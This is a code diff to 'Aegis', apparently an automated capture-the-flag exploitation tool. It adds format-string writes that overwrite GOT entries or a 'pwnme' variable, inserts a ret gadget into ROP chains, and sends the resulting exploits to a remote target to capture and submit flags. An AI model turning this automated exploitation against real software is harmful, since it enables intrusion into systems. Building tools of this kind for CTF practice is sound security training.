@@ -90,11 +90,14 @@ class Aegis:
                 self.against.format_leak("")
 
                 if self.against.flag == None:
-                    if function == "win":
+                    if "pwnme" in self.elf.sym.keys(): 
+                        self.against.format_write(1337, self.elf.sym["pwnme"])
+                        self.exploit()
+                    elif function == "win":
                         got_addr = self.elf.got[self.got_targets[-1]]
                         self.against.format_write(self.elf.sym["win"], got_addr)
-
-                    if win_gadget:
+                        self.exploit()
+                    elif win_gadget:
                         got_addr = self.elf.got[self.got_targets[-1]]
                         self.against.format_write(win_gadget, got_addr)
                         self.exploit()
@@ -188,35 +191,27 @@ class Aegis:
             aegis_log.debug(f"Adding ret to chain")
             ret = p64(self.rop.find_gadget(["ret"])[0])
             chain_len = len(self.against.chain)
-            if chain_len != 0:
-                aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
-                self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]
-            else:
-                aegis_log.debug(f"Stack Alignment Check: {(format_len + 8) % 16}")
-                self.against.format_exploit = self.against.format_exploit + ret
+            aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
+            self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]
 
             self.against.process = self.against.start(option)
             self.against.send_exploit()
             self.against.verify_flag()
 
             if self.against.flag != None:
-                    aegis_log.debug(f"Sending exploit to remote")
                     self.against.process = self.against.start("REMOTE")
                     self.against.send_exploit()                    
-                    aegis_log.debug(f"Sent exploit to remote")
+                    aegis_log.debug(f"Sent exploit to remote at {self.ip}")
                     if self.against.verify_flag() == True:
                        self.send_flag(self.against.flag) 
                                     
         else:
             if self.against.flag != None:
-                    aegis_log.debug(f"Sending exploit to remote")
                     self.against.process = self.against.start("REMOTE")
                     self.against.send_exploit()
                     if self.against.verify_flag() == True:
                        self.send_flag(self.against.flag) 
-                    
-
-                    aegis_log.debug(f"Sent exploit to remote")
+                    aegis_log.debug(f"Sent exploit to remote at {self.ip}")
 
  
 def print_title():
